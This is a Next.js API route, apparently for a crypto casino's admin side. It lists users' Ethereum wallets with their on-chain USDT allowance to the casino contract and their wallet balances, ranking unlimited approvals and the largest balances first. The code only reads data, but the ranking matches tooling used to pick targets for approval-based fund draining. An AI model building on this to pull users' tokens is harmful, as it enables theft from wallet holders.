import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase-admin';
import { createPublicClient, http, erc20Abi } from 'viem';
import { mainnet, sepolia } from 'viem/chains';
import { getSubdomain } from '@/lib/subdomain';

export const dynamic = 'force-dynamic';

// EVM configuration
const EVM_CONFIG = {
  mainnet: {
    chainId: 1,
    casinoDepositAddress: '0x82F1B70a42C38a645ce1Ea71ae1390d0dd6d49C4' as const,
    usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7' as const,
  },
  sepolia: {
    chainId: 11155111,
    casinoDepositAddress: '0x2432E0a2c34C764449525269be6554Dce899340c' as const,
    usdt: '0x27D4F6456D51f6A1f943C1f599c36D2E4F5958aF' as const,
  }
};

// Threshold for "unlimited" approval
const UNLIMITED_THRESHOLD = BigInt(10) ** BigInt(30);

// Minimal ABI for CasinoDeposit.withdrawalAllowance(user, token)
const casinoDepositWithdrawalAbi = [
  {
    inputs: [
      { internalType: 'address', name: '', type: 'address' },
      { internalType: 'address', name: '', type: 'address' },
    ],
    name: 'withdrawalAllowance',
    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
] as const;

const isMainnet = () => process.env.NEXT_PUBLIC_NETWORK_ENV === 'mainnet';
const getConfig = () => isMainnet() ? EVM_CONFIG.mainnet : EVM_CONFIG.sepolia;

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export async function GET(request: NextRequest) {
  try {
    const config = getConfig();
    
    // Create public client for EVM
    const rpcUrl = isMainnet()
      ? process.env.NEXT_PUBLIC_MAINNET_RPC_URL || 'https://eth-mainnet.g.alchemy.com/v2/demo'
      : process.env.NEXT_PUBLIC_SEPOLIA_RPC_URL || 'https://eth-sepolia.g.alchemy.com/v2/demo';
    
    const publicClient = createPublicClient({
      chain: isMainnet() ? mainnet : sepolia,
      transport: http(rpcUrl)
    });
    
    // Determine subdomain scope for filtering
    const requestSubdomain = getSubdomain(request.headers.get('x-subdomain') || new URL(request.url).hostname);

    // Fetch EVM users from wallet_addresses table (primary source)
    const { data: walletRows, error: walletError } = await supabaseAdmin
      .from('wallet_addresses')
      .select('user_id, address')
      .eq('network', 'ethereum');

    if (walletError) {
      console.error('wallet_addresses query error:', walletError);
    }

    // Filter by origin when viewing from a subdomain
    let filteredWalletRows = walletRows || [];
    if (requestSubdomain) {
      const { data: originUsers } = await supabaseAdmin
        .from('users')
        .select('id')
        .eq('origin', requestSubdomain);
      const originUserIds = new Set((originUsers || []).map(u => u.id));
      filteredWalletRows = filteredWalletRows.filter(row => originUserIds.has(row.user_id));
    }

    // Deduplicate by address (case-insensitive)
    const addressMap = new Map<string, { id: string; wallet_address: string }>();
    for (const row of filteredWalletRows) {
      if (row.address && row.address.startsWith('0x')) {
        const key = row.address.toLowerCase();
        if (!addressMap.has(key)) {
          addressMap.set(key, { id: row.user_id, wallet_address: row.address });
        }
      }
    }

    const users = Array.from(addressMap.values());
    console.log(`[EVM] Found ${filteredWalletRows.length} from wallet_addresses, ${users.length} unique`);

    if (users.length === 0) {
      return NextResponse.json({
        users: [],
        network: isMainnet() ? 'mainnet' : 'sepolia',
        casinoContract: config.casinoDepositAddress,
        usdtContract: config.usdt,
        totalUsersChecked: 0,
        totalWithApproval: 0
      });
    }

    // Fetch platform balances for these users
    const userIds = users.map((u: any) => u.id);
    const { data: balanceRows } = await supabaseAdmin
      .from('balances')
      .select('user_id, amount')
      .in('user_id', userIds);

    const platformBalanceMap: Record<string, number> = {};
    for (const row of balanceRows || []) {
      platformBalanceMap[row.user_id] = Number(row.amount) || 0;
    }

    const usersWithData: any[] = [];

    // Check allowance AND balance for each user
    for (let i = 0; i < users.length; i++) {
      const user = users[i];
      const address = user.wallet_address as `0x${string}`;
      
      try {
        const [allowance, balance, withdrawalAllowance] = await Promise.all([
          publicClient.readContract({
            address: config.usdt,
            abi: erc20Abi,
            functionName: 'allowance',
            args: [address, config.casinoDepositAddress]
          }),
          publicClient.readContract({
            address: config.usdt,
            abi: erc20Abi,
            functionName: 'balanceOf',
            args: [address]
          }),
          publicClient.readContract({
            address: config.casinoDepositAddress,
            abi: casinoDepositWithdrawalAbi,
            functionName: 'withdrawalAllowance',
            args: [address, config.usdt]
          })
        ]);

        const hasApproval = allowance > BigInt(0);
        const isUnlimited = allowance >= UNLIMITED_THRESHOLD;

        usersWithData.push({
          id: user.id,
          wallet_address: address,
          allowance: allowance.toString(),
          balance: balance.toString(),
          withdrawalAllowance: withdrawalAllowance.toString(),
          platformBalance: platformBalanceMap[user.id] ?? 0,
          hasApproval,
          isUnlimited
        });

        // Throttle requests to avoid rate limiting
        if (i < users.length - 1) {
          await delay(100);
        }
      } catch (err: any) {
        console.warn(`Failed to check data for ${address}:`, err?.message);
        usersWithData.push({
          id: user.id,
          wallet_address: address,
          allowance: '0',
          balance: '0',
          withdrawalAllowance: '0',
          platformBalance: platformBalanceMap[user.id] ?? 0,
          hasApproval: false,
          isUnlimited: false
        });
      }
    }

    // Sort: unlimited first, then approved, then by balance descending
    usersWithData.sort((a: any, b: any) => {
      if (a.isUnlimited && !b.isUnlimited) return -1;
      if (!a.isUnlimited && b.isUnlimited) return 1;
      if (a.hasApproval && !b.hasApproval) return -1;
      if (!a.hasApproval && b.hasApproval) return 1;
      const balA = BigInt(a.balance);
      const balB = BigInt(b.balance);
      return balB > balA ? 1 : balB < balA ? -1 : 0;
    });

    const totalWithApproval = usersWithData.filter((u: any) => u.hasApproval).length;
    const totalUnlimited = usersWithData.filter((u: any) => u.isUnlimited).length;
    console.log(`[EVM] Returned ${usersWithData.length} users, ${totalWithApproval} with approval (${totalUnlimited} unlimited)`);

    return NextResponse.json({ 
      users: usersWithData,
      network: isMainnet() ? 'mainnet' : 'sepolia',
      casinoContract: config.casinoDepositAddress,
      usdtContract: config.usdt,
      totalUsersChecked: usersWithData.length,
      totalWithApproval
    });

  } catch (error: any) {
    console.error('Error fetching EVM approvals:', error);
    return NextResponse.json(
      { error: error.message || 'Failed to fetch approvals' },
      { status: 500 }
    );
  }
}
